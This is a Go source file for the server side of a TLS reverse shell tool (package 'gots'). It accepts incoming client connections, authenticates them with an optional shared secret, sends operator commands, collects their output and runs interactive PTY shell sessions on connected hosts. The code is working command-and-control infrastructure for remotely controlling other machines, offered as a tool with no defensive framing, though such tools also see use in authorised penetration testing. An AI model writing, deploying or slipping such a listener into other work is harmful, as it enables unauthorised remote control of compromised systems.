package server

import (
	"bufio"
	"crypto/subtle"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/frjcomp/gots/pkg/compression"
	"github.com/frjcomp/gots/pkg/protocol"
)

// Listener represents a TLS reverse shell listener server that accepts client connections,
// manages them, and dispatches commands to connected clients.
type Listener struct {
	port              string
	networkInterface  string
	tlsConfig         *tls.Config
	sharedSecret      string // Optional shared secret for authentication
	clientConnections map[string]chan string
	clientResponses   map[string]chan string
	clientPausePing   map[string]chan bool
	clientPtyMode     map[string]bool        // Track if client is in PTY mode
	clientPtyData     map[string]chan []byte // PTY data channels
	clientIdentifiers map[string]string      // Short client-provided identifiers
	mutex             sync.Mutex
}

// NewListener creates a new reverse shell listener with the given port,
// network interface, TLS configuration, and optional shared secret.
func NewListener(port, networkInterface string, tlsConfig *tls.Config, sharedSecret string) *Listener {
	return &Listener{
		port:              port,
		networkInterface:  networkInterface,
		tlsConfig:         tlsConfig,
		sharedSecret:      sharedSecret,
		clientConnections: make(map[string]chan string),
		clientResponses:   make(map[string]chan string),
		clientPausePing:   make(map[string]chan bool),
		clientPtyMode:     make(map[string]bool),
		clientPtyData:     make(map[string]chan []byte),
		clientIdentifiers: make(map[string]string),
	}
}

// Start begins listening for client connections on the configured port and interface.
// It returns the underlying net.Listener and starts accepting connections in a background goroutine.
func (l *Listener) Start() (net.Listener, error) {
	address := fmt.Sprintf("%s:%s", l.networkInterface, l.port)
	log.Printf("Starting TLS listener on %s", address)

	listener, err := tls.Listen("tcp", address, l.tlsConfig)
	if err != nil {
		return nil, fmt.Errorf("failed to create TLS listener: %w", err)
	}

	go l.acceptConnections(listener)
	return listener, nil
}

// acceptConnections accepts incoming client connections
func (l *Listener) acceptConnections(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			// Check if the listener was closed
			if errors.Is(err, net.ErrClosed) || strings.Contains(err.Error(), "use of closed network connection") {
				return
			}
			log.Printf("Error accepting connection: %v", err)
			continue
		}
		go l.handleClient(conn)
	}
}

// handleClient handles a single client connection
func (l *Listener) handleClient(conn net.Conn) {
	clientAddr := conn.RemoteAddr().String()
	log.Printf("\n[+] New client connected: %s", clientAddr)
	defer conn.Close()

	reader := bufio.NewReaderSize(conn, protocol.BufferSize1MB)
	writer := bufio.NewWriterSize(conn, protocol.BufferSize1MB)

	// Perform authentication if shared secret is configured
	if l.sharedSecret != "" {
		// Wait for AUTH command
		line, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("WARNING: Authentication failed for %s: failed to read auth: %v", clientAddr, err)
			return
		}

		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, protocol.CmdAuth+" ") {
			log.Printf("WARNING: Authentication failed for %s: expected AUTH command", clientAddr)
			writer.WriteString(protocol.CmdAuthFailed + "\n")
			writer.Flush()
			return
		}

		receivedSecret := strings.TrimPrefix(line, protocol.CmdAuth+" ")
		if subtle.ConstantTimeCompare(
			[]byte(receivedSecret),
			[]byte(l.sharedSecret),
		) != 1 {
			writer.WriteString(protocol.CmdAuthFailed + "\n")
			writer.Flush()
			return
		}

		// Authentication successful
		writer.WriteString(protocol.CmdAuthOk + "\n")
		if err := writer.Flush(); err != nil {
			log.Printf("[-] Failed to send auth response to %s: %v", clientAddr, err)
			return
		}
		log.Printf("[+] Client %s authenticated successfully", clientAddr)
	}

	cmdChan := make(chan string, 10)
	respChan := make(chan string, 10)
	pausePing := make(chan bool, 1)

	l.mutex.Lock()
	l.clientConnections[clientAddr] = cmdChan
	l.clientResponses[clientAddr] = respChan
	l.clientPausePing[clientAddr] = pausePing
	l.mutex.Unlock()

	defer func() {
		l.mutex.Lock()
		delete(l.clientConnections, clientAddr)
		delete(l.clientResponses, clientAddr)
		delete(l.clientPausePing, clientAddr)
		delete(l.clientIdentifiers, clientAddr)
		if ptyDataChan, exists := l.clientPtyData[clientAddr]; exists {
			close(ptyDataChan)
			delete(l.clientPtyData, clientAddr)
		}
		delete(l.clientPtyMode, clientAddr)
		l.mutex.Unlock()
		close(cmdChan)
		close(respChan)
		log.Printf("[-] Client disconnected: %s", clientAddr)
	}()

	// Track if response reader goroutine has failed
	readerFailed := make(chan bool, 1)

	// Read responses from client
	go func() {
		var responseBuffer strings.Builder
		for {
			line, err := reader.ReadString('\n')

			// Append what we received, even if the buffer filled before newline
			responseBuffer.WriteString(line)

			// If the buffer filled before we hit a newline, keep reading without closing the connection
			if errors.Is(err, bufio.ErrBufferFull) {
				if responseBuffer.Len() > protocol.MaxBufferSize {
					log.Printf("Response from client %s exceeds max buffer size without delimiter; resetting buffer", clientAddr)
					responseBuffer.Reset()
				}
				continue
			}

			if err != nil {
				if err != io.EOF {
					log.Printf("Error reading from client %s: %v", clientAddr, err)
				}
				readerFailed <- true
				return
			}

			// Check for client identifier announcement
			currentLine := responseBuffer.String()
			if strings.HasPrefix(currentLine, protocol.CmdIdent+" ") {
				id := strings.TrimSpace(strings.TrimPrefix(currentLine, protocol.CmdIdent+" "))
				id = strings.TrimSuffix(id, "\n")
				l.mutex.Lock()
				l.clientIdentifiers[clientAddr] = id
				l.mutex.Unlock()
				log.Printf("[+] Client %s identifier: %s", clientAddr, id)
				responseBuffer.Reset()
				continue
			}

			// Check for PTY data
			if strings.HasPrefix(currentLine, protocol.CmdPtyData+" ") {
				encoded := strings.TrimPrefix(currentLine, protocol.CmdPtyData+" ")
				encoded = strings.TrimSuffix(encoded, "\n")

				// Decompress hex PTY data
				data, err := compression.DecompressHex(encoded)
				if err != nil {
					log.Printf("Error decompressing PTY data from %s: %v", clientAddr, err)
					responseBuffer.Reset()
					continue
				}

				l.mutex.Lock()
				ptyDataChan, exists := l.clientPtyData[clientAddr]
				l.mutex.Unlock()

				if exists {
					select {
					case ptyDataChan <- data:
					default:
						log.Printf("Warning: PTY data channel full for client %s", clientAddr)
					}
				}
				responseBuffer.Reset()
				continue
			}

			// Check for PTY exit
			if strings.HasPrefix(currentLine, protocol.CmdPtyExit) {
				l.ExitPtyMode(clientAddr)
				responseBuffer.Reset()
				continue
			}

			// Check if we've reached the end of output marker anywhere in the buffer
			if strings.Contains(responseBuffer.String(), protocol.EndOfOutputMarker) {
				fullResponse := responseBuffer.String()
				// Non-blocking send to avoid deadlock if response channel is full
				select {
				case respChan <- fullResponse:
					// Successfully sent
				default:
					// Channel full, drop this response and log warning
					log.Printf("Warning: response channel full for client %s, dropping response", clientAddr)
				}
				responseBuffer.Reset()
			}
		}
	}()

	// Wait for commands
	pingTicker := time.NewTicker(protocol.PingInterval * time.Second)
	defer pingTicker.Stop()
	pingPaused := false

	for {
		select {
		case cmd, ok := <-cmdChan:
			if !ok {
				return
			}
			fmt.Fprintf(writer, "%s\n", cmd)
			writer.Flush()

			if cmd == protocol.CmdExit {
				return
			}
		case <-readerFailed:
			log.Printf("Reader failed for client %s, closing connection", clientAddr)
			return
		case pause := <-pausePing:
			pingPaused = pause
		case <-pingTicker.C:
			// Only send PING if not paused (i.e., not waiting for command response)
			if !pingPaused {
				fmt.Fprintf(writer, "%s\n", protocol.CmdPing)
				writer.Flush()
			}
		}
	}
}

// GetClients returns a list of currently connected client addresses.
func (l *Listener) GetClients() []string {
	l.mutex.Lock()
	defer l.mutex.Unlock()

	clients := make([]string, 0, len(l.clientConnections))
	for addr := range l.clientConnections {
		clients = append(clients, addr)
	}
	return clients
}

// GetClientIdentifier returns the short identifier for a client if present.
func (l *Listener) GetClientIdentifier(clientAddr string) string {
	l.mutex.Lock()
	defer l.mutex.Unlock()
	return l.clientIdentifiers[clientAddr]
}

// SendCommand sends a command to a specific client identified by its address.
// It returns an error if the client is not found or if the send times out.
func (l *Listener) SendCommand(clientAddr, cmd string) error {
	l.mutex.Lock()
	cmdChan, exists := l.clientConnections[clientAddr]
	pauseChan, pauseExists := l.clientPausePing[clientAddr]
	l.mutex.Unlock()

	if !exists {
		return fmt.Errorf("client %s not found", clientAddr)
	}

	// Pause PING to avoid interference with command response
	if pauseExists {
		// Ensure the pause signal is delivered even if a previous value is buffered
		select {
		case <-pauseChan:
		default:
		}
		select {
		case pauseChan <- true:
		default:
		}
	}

	select {
	case cmdChan <- cmd:
		return nil
	case <-time.After(protocol.ResponseTimeout * time.Second):
		return fmt.Errorf("timeout sending command")
	}
}

// GetResponse waits for and returns the response from a client within the given timeout.
// It returns an error if the client is not found or if the timeout is exceeded.
func (l *Listener) GetResponse(clientAddr string, timeout time.Duration) (string, error) {
	l.mutex.Lock()
	respChan, exists := l.clientResponses[clientAddr]
	pauseChan, pauseExists := l.clientPausePing[clientAddr]
	l.mutex.Unlock()

	if !exists {
		return "", fmt.Errorf("client %s not found", clientAddr)
	}

	// Resume PING after getting response
	defer func() {
		if pauseExists {
			select {
			case <-pauseChan:
			default:
			}
			select {
			case pauseChan <- false:
			default:
			}
		}
	}()

	deadline := time.Now().Add(timeout)

	cleanResp := func(resp string) string {
		r := strings.ReplaceAll(resp, "\r", "")
		r = strings.ReplaceAll(r, protocol.EndOfOutputMarker, "")
		return strings.TrimSpace(r)
	}

	// Drop any stale keepalive responses before waiting for the real reply
	for {
		select {
		case resp := <-respChan:
			clean := cleanResp(resp)
			if clean == protocol.CmdPong || clean == protocol.CmdPing {
				continue
			}
			// Found a real response buffered from earlier
			return resp, nil
		default:
			goto waitForFresh
		}
	}

waitForFresh:

	for {
		remaining := time.Until(deadline)
		if remaining <= 0 {
			return "", fmt.Errorf("timeout waiting for response")
		}

		select {
		case resp := <-respChan:
			clean := cleanResp(resp)
			if clean == protocol.CmdPong || clean == protocol.CmdPing {
				continue
			}
			return resp, nil
		case <-time.After(remaining):
			return "", fmt.Errorf("timeout waiting for response")
		}
	}
}

// GetClientAddressSorted returns sorted client addresses for consistent ordering
func (l *Listener) GetClientAddressesSorted() []string {
	l.mutex.Lock()
	defer l.mutex.Unlock()

	clients := make([]string, 0, len(l.clientConnections))
	for addr := range l.clientConnections {
		clients = append(clients, addr)
	}
	// Sort addresses alphabetically
	sort.Strings(clients)
	return clients
}

// EnterPtyMode puts a client into PTY mode for interactive shell
func (l *Listener) EnterPtyMode(clientAddr string) (chan []byte, error) {
	l.mutex.Lock()
	defer l.mutex.Unlock()

	if _, exists := l.clientConnections[clientAddr]; !exists {
		return nil, fmt.Errorf("client %s not found", clientAddr)
	}

	if l.clientPtyMode[clientAddr] {
		return nil, fmt.Errorf("client %s already in PTY mode", clientAddr)
	}

	ptyDataChan := make(chan []byte, 100)
	l.clientPtyData[clientAddr] = ptyDataChan
	l.clientPtyMode[clientAddr] = true

	return ptyDataChan, nil
}

// ExitPtyMode exits PTY mode for a client
func (l *Listener) ExitPtyMode(clientAddr string) error {
	l.mutex.Lock()
	defer l.mutex.Unlock()

	if !l.clientPtyMode[clientAddr] {
		return nil
	}

	if ptyDataChan, exists := l.clientPtyData[clientAddr]; exists {
		close(ptyDataChan)
		delete(l.clientPtyData, clientAddr)
	}

	l.clientPtyMode[clientAddr] = false
	return nil
}

// IsInPtyMode checks if a client is in PTY mode
func (l *Listener) IsInPtyMode(clientAddr string) bool {
	l.mutex.Lock()
	defer l.mutex.Unlock()
	return l.clientPtyMode[clientAddr]
}

// GetPtyDataChan returns the PTY data channel for a client
func (l *Listener) GetPtyDataChan(clientAddr string) (chan []byte, bool) {
	l.mutex.Lock()
	defer l.mutex.Unlock()
	ch, exists := l.clientPtyData[clientAddr]
	return ch, exists
}
